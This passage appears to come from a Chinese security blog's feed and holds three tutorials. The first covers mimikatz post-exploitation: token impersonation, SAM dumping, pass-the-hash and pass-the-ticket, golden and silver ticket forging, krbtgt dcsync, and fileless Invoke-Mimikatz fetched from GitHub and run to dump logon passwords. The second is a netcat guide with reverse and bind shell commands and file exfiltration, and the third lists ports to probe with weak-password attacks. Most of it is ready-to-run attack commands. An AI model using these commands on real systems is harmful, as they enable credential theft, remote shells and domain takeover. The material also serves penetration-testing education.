title="使用mimikatz的token模块中的命令列出token，模仿system用户token，最后恢复到原来的token"></a>使用mimikatz的token模块中的命令列出token，模仿system用户token，最后恢复到原来的token</h3><p>以管理员身份运行mimikatz——&gt;使用<code>privilege::debug</code>获取debug权限——&gt;使用<code>token::elevate</code>模仿system用户的令牌——&gt;使用<code>token::list</code>列出令牌——&gt;使用 <code>lsadump::sam</code>来获取sam数据库中的密码——&gt;使用<code>token::revert</code>恢复令牌</p><h2 id="Mimikatz后渗透"><a href="#Mimikatz后渗透" class="headerlink" title="Mimikatz后渗透"></a>Mimikatz后渗透</h2><p>在kerberos认证中，如果需要向某个服务发起认证，首先需要获取到TGT，之后拿着这张TGT去获得ST。微软的kerberos认证支持rc4加密，它会使用服务器的ntlm hash作为加密票据的密钥。那么当获取到ST后，就能尝试暴力破解服务器的密码hash。</p><h3 id="Pass-The-Hash"><a href="#Pass-The-Hash" class="headerlink" title="Pass-The-Hash"></a>Pass-The-Hash</h3><pre><code>sekurlsa::pth /domain:GUOXIANG.com /user:administrator /ntlm 保存的hash</code></pre><h3 id="Pass-The-Ticket"><a href="#Pass-The-Ticket" class="headerlink" title="Pass-The-Ticket"></a>Pass-The-Ticket</h3><p>查看当前用户的ticket</p><pre><code>Kerberos::list</code></pre><p>导出当前用户的ticket</p><pre><code>Kerberos::list /export</code></pre><p>查看所有ticket</p><pre><code>Sekurlsa::tickets</code></pre><p>导出所有ticket</p><pre><code>Sekurlsa::tickets /export</code></pre><p>获得需要的票据后，可以在其他机器上导入此票据：</p><pre><code>Kerberos:ptt 票据名</code></pre><p>导入不依赖管理员权限，比较方便。假设导入了域管的票据，则我们可以dir域控的c$共享：<code>Dir\\DC\c$</code>来进行测试。</p><p>需要注意的是UNC路径中需要使用主机名DC，而不能使用172.17.1.1这样的ip地址，否则可能会被拒绝访问。</p><h2 id="Golden-Ticket"><a href="#Golden-Ticket" class="headerlink" title="Golden Ticket"></a>Golden Ticket</h2><p>黄金票据（golden ticket）是一种为任意用户生成TGT票据的方法。只要获取<strong>kribtgt账户的密码HASH</strong>、<strong>域sid</strong>、<strong>域名</strong>和<strong>域账户</strong>，黄金票据即可离线生成，而且不受TGT生命周期的影响（默认10小时，最多续订7天）</p><h3 id="kribtgt账户的密码HASH"><a href="#kribtgt账户的密码HASH" class="headerlink" title="kribtgt账户的密码HASH"></a>kribtgt账户的密码HASH</h3><p>kribtgt账户的密码hash存储在域控制器上，因此需要获得域管理员权限。</p><p>获取krbtgt的hash：</p><pre><code>lsadump::dcsync /domain:GUOXIANG.com /user:krbtgt</code></pre><p>我们可以使用<code>aes256_hmac</code>这一行的hash。</p><h3 id="域sid"><a href="#域sid" class="headerlink" title="域sid"></a>域sid</h3><p>域的sid可以使用工具<strong>psgetsid</strong>获取，也可以在获取域成员shell后使用<code>whoami /user</code>获取。例如域用户sid为<code>S-1-5-21-3187487621-2881332574-933047120-1105</code>，则1105之前的就是域sid</p><h3 id="生成黄金票据"><a href="#生成黄金票据" class="headerlink" title="生成黄金票据"></a>生成黄金票据</h3><p>获取到上述信息后，就可以使用mimikatz的<code>kerberos::golden</code>生成黄金票据</p><pre><code>Kerberos::golden /user：guoxiang /sid:域sid /aes256:krbtgt账户aes256加密的hash /domain:GUOXIANG.com /ticket:golden.kirbi</code></pre><p>当需要使用黄金票据的时候，使用mimikatz：</p><pre><code>Kerberos:ptt golden.kribi</code></pre><h2 id="Silver-Ticket"><a href="#Silver-Ticket" class="headerlink" title="Silver Ticket"></a>Silver Ticket</h2><p>黄金票据伪造的是TGT，而白银票据则伪造ST。</p><p>由于ST针对特定的服务，因此白银票据只能用来<strong>认证特定服务</strong>，而黄金票据则可以用于<strong>认证任何kerberos服务</strong>。</p><p>使用白银票据并不需要和域控通信（使用ST直接和目标服务器通信），而使用黄金票据则需要与域控通信（需要使用伪造的TGT来获取ST）</p><h3 id="生成白银票据"><a href="#生成白银票据" class="headerlink" title="生成白银票据"></a>生成白银票据</h3><p>生成白银票据需要：</p><ul><li>域名</li><li>sid</li><li>用户名：可以是任意用户</li><li>服务名：如cifs、ldap等</li><li>目标计算机账户密码hash（<strong>这里需要win-xxxxxx$这类账户的ntlm hash，否则会导致认证失败</strong>）</li></ul><p>获取到上述信息后：</p><pre><code>kerberos::golden /admin:guoxiang /domain:GUOXIANG.com /id:1105 /sid:S-1-5-21-2236738896-1661306322-1924668396 target:guoxiang.GUOXIANG.com /rc4:35493c328494b75aff81d2ffcf173787 /service:LDAP /ptt</code></pre><p>到处白银票据。</p><p>Mimikatz中的<strong>dcsync</strong>通过<strong>drsr  协议</strong>向域控发起复制用户凭证的请求。使用这种方式，无需登录到域控上，只通过网络就能够获取用户的凭证。前面讲解的黄金和白银票据可以实现对域控的持久访问，配合dcsync即可在域成员主机上提取凭证。</p><h2 id="Powershell版的Mimikatz"><a href="#Powershell版的Mimikatz" class="headerlink" title="Powershell版的Mimikatz"></a>Powershell版的Mimikatz</h2><p>一句话执行：</p><pre><code>powershell Import-Module .\Invoke-Mimikatz.ps1;Invoke-Mimikatz -Command &apos;&quot;privilege::debug&quot; &quot;sekurlsa::logonPasswords full&quot;&apos;</code></pre><p>无文件执行：</p><pre><code>powershell Iex (new-object net.webclient).downloadstring(‘https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1’);Invoke-Mimikatz -Command &apos;&quot;privilege::debug&quot; &quot;sekurlsa::logonPasswords full&quot;&apos;</code></pre>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;h2 id=&quot;mimikatz抓取用户密码&quot;&gt;&lt;a href=&quot;#mimikatz抓取用户密码&quot; class=&quot;headerlink&quot; title=&quot;mimikatz抓取用户密码&quot;&gt;&lt;/a&gt;mimikatz抓取用户密码&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://githu
-      
-    
-    </summary>
-    
-      <category term="内网渗透工具" scheme="http://yoursite.com/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7/"/>
-    
-    
-  </entry>
-  
-  <entry>
-    <title>nc命令使用</title>
-    <link href="http://yoursite.com/2018/12/04/nc%E5%91%BD%E4%BB%A4%E4%BD%BF%E7%94%A8/"/>
-    <id>http://yoursite.com/2018/12/04/nc命令使用/</id>
-    <published>2018-12-04T15:07:24.000Z</published>
-    <updated>2018-12-04T15:12:54.197Z</updated>
-    
-    <content type="html"><![CDATA[<h1 id="Netcat-nc"><a href="#Netcat-nc" class="headerlink" title="Netcat(nc):"></a>Netcat(nc):</h1><p>NC（netcat）被称为网络工具中的瑞士军刀，体积小巧，但功能强大。</p><p>Nc可以在两台设备上面相互交互，即侦听模式/传输模式</p><ul><li>Telnet功能</li><li>获取banner信息</li><li>传输文本信息</li><li>传输文件/目录</li><li>加密传输文件，默认不加密</li><li>远程控制</li><li>加密所有流量</li><li>流媒体服务器</li><li>远程克隆硬盘</li></ul><h2 id="常用参数："><a href="#常用参数：" class="headerlink" title="常用参数："></a>常用参数：</h2><ul><li>-n 以数字形式表示的IP地址</li><li>-v 显示详细信息 [使用=vv获取更详细的信息</li><li>-l 监听入站信息</li><li>-p port 本地端口</li><li>-q secs 在标准输入且延迟后退出</li><li>-c shell commands shell模式</li><li>-u UDP模式</li><li>-s addr 本地源地址</li><li>-h 获取帮助信息</li><li>-z I/O 模式 [扫描时使用]</li></ul><h2 id="实例："><a href="#实例：" class="headerlink" title="实例："></a>实例：</h2><h3 id="正向连接"><a href="#正向连接" class="headerlink" title="正向连接"></a>正向连接</h3><pre><code>A:nc -lp port -c bashB:nc ip port</code></pre><p>A将自己的Bash发给B</p><h3 id="反向连接"><a href="#反向连接" class="headerlink" title="反向连接"></a>反向连接</h3><pre><code>A:nc -lp portB:nc ip port -c bash</code></pre><p>B将自己的Bash发给A</p><blockquote><p>win下Bash换成cmd</p></blockquote><p>通常反向连接 比较常用，因为防火墙的存在，让目标机主动发送shell</p><h2 id="使用NC进行信息收集"><a href="#使用NC进行信息收集" class="headerlink" title="使用NC进行信息收集"></a>使用NC进行信息收集</h2><h3 id="简单的建立连接，就是侦听模式和传输模式"><a href="#简单的建立连接，就是侦听模式和传输模式" class="headerlink" title="简单的建立连接，就是侦听模式和传输模式"></a>简单的建立连接，就是侦听模式和传输模式</h3><ul><li>nc -lp port  监听指定端口号</li><li>nc -nv ip port  连接对方tcp端口，默认情况下，双方可以发送文本信息</li></ul><h3 id="收集目标机上的进程信息"><a href="#收集目标机上的进程信息" class="headerlink" title="收集目标机上的进程信息"></a>收集目标机上的进程信息</h3><ul><li>nc -l -p 4444 &gt;wing.txt 将远程发送过来的内容保存在本地</li><li>Ps aux |nc -nv ip port -q 1  标准输入完成后delay一秒钟，会发送到侦听端</li></ul><h2 id="NC传输文件-目录"><a href="#NC传输文件-目录" class="headerlink" title="NC传输文件/目录"></a>NC传输文件/目录</h2><ul><li>nc -lp 4444 &gt;1.txt 1.txt就是你要保存的文件名 自定义</li><li>nc -nv ip port &lt;1.txt -q 1 将文件发送给侦听端<blockquote><p>侦听端的文件名最好按照文件本身来命名</p></blockquote></li></ul><p><strong>将目录打包：</strong></p><p>tar -cvf - 目录名/|nc -lp port -q 1</p><p><strong>将目录解包</strong></p><p>nc -nv ip port |tar -xvf -</p><p><strong>NC端口扫描</strong></p><p>nc -nvz ip 1-65535</p><h2 id="NC文件加密传输"><a href="#NC文件加密传输" class="headerlink" title="NC文件加密传输"></a>NC文件加密传输</h2><pre><code>apt-get install mcryptA： nc -lp port|mcrypt - -flush -Fbqd -a rijndael-256 -m ecb &gt;文件名B：mcrypt --flush -Fbq -a rijndael-256 -m ecb &lt;文件名|nc -nv ip port -q 1</code></pre><p>B将文件加密发送，A接受后先解密再保存到本地，B在1s后退出。<br>主要是利用mcrypt进行加密</p><h2 id="NC端口扫描"><a href="#NC端口扫描" class="headerlink" title="NC端口扫描"></a>NC端口扫描</h2><p>nc -nvz ip 1-65535</p><p><img src="http://ww1.sinaimg.cn/large/007pEd8Wly1fxv4a6vt6pj30kn0hc406.jpg" alt=""></p><p>默认使用tcp进行扫描</p><h2 id="NC复制磁盘"><a href="#NC复制磁盘" class="headerlink" title="NC复制磁盘"></a>NC复制磁盘</h2><pre><code>A:nc -lp port |dd of=/dev/sdaB: dd if=/dev/sda | nc -nc ip port -q 1</code></pre><ul><li>If是input filter</li><li>Of 是output filter</li></ul><p>B将数据复制到A挂载的硬盘上</p>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;h1 id=&quot;Netcat-nc&quot;&gt;&lt;a href=&quot;#Netcat-nc&quot; class=&quot;headerlink&quot; title=&quot;Netcat(nc):&quot;&gt;&lt;/a&gt;Netcat(nc):&lt;/h1&gt;&lt;p&gt;NC（netcat）被称为网络工具中的瑞士军刀，体积小巧，但功能强大。&lt;/p
-      
-    
-    </summary>
-    
-      <category term="命令使用" scheme="http://yoursite.com/categories/%E5%91%BD%E4%BB%A4%E4%BD%BF%E7%94%A8/"/>
-    
-    
-  </entry>
-  
-  <entry>
-    <title>常见的漏洞端口</title>
-    <link href="http://yoursite.com/2018/12/04/%E5%B8%B8%E8%A7%81%E7%9A%84%E6%BC%8F%E6%B4%9E%E7%AB%AF%E5%8F%A3/"/>
-    <id>http://yoursite.com/2018/12/04/常见的漏洞端口/</id>
-    <published>2018-12-04T07:48:29.000Z</published>
-    <updated>2018-12-12T09:15:44.733Z</updated>
-    
-    <content type="html"><![CDATA[<p><strong>21</strong> ftp 主要看是否支持匿名，也可以跑弱口令</p><p><strong>22</strong> ssh SSH远程登录协议</p><p><strong>23</strong> telnet telnet终端仿真协议</p><p><strong>80</strong> web 常见web漏洞以及是否为一些管理后台</p><p><strong>389</strong> LDAP（轻量目录访问协议）存在匿名访问</p><p><strong>443</strong> openssl 心脏滴血以及一些web漏洞测试</p><p><strong>873</strong> rsync 主要看是否支持匿名，也可以跑弱口令</p><p><strong>1099</strong>  JAVArmi  命令执行</p><p><strong>1433</strong> SQl server</p><p><strong>1521</strong>  Oracle   弱口令</p><p><strong>3306</strong> MySQL 能够外联数据库</p><p><strong>3389</strong> RDP 远程桌面看看能不能弱口令</p><p><strong>5432</strong>        PostGreSQL       弱口令爆破</p><p><strong>6379</strong> redis 一般无认证，可直接访问</p><p><strong>7001，7002</strong>  weblogic的console口</p><p><strong>8080</strong>  Tomcat\Jboss     弱口令，Jboss匿名访问</p><p><strong>8080-8090</strong>   常见Web端口</p><p><strong>9000</strong> fast-cgi对外可以getshell</p><p><strong>9043</strong>        WebSphere        弱口令爆破</p><p><strong>27017</strong>    MongoDB          未授权访问</p>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;p&gt;&lt;strong&gt;21&lt;/strong&gt; ftp 主要看是否支持匿名，也可以跑弱口令&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;22&lt;/strong&gt; ssh SSH远程登录协议&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;23&lt;/strong&gt; telnet telnet终端仿真协议&lt;/p&gt;
-&lt;p&gt;
-      
-    
-    </summary>
-    
-      <category term="信息收集" scheme="http://yoursite.com/categories/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
     
     
   </entry>
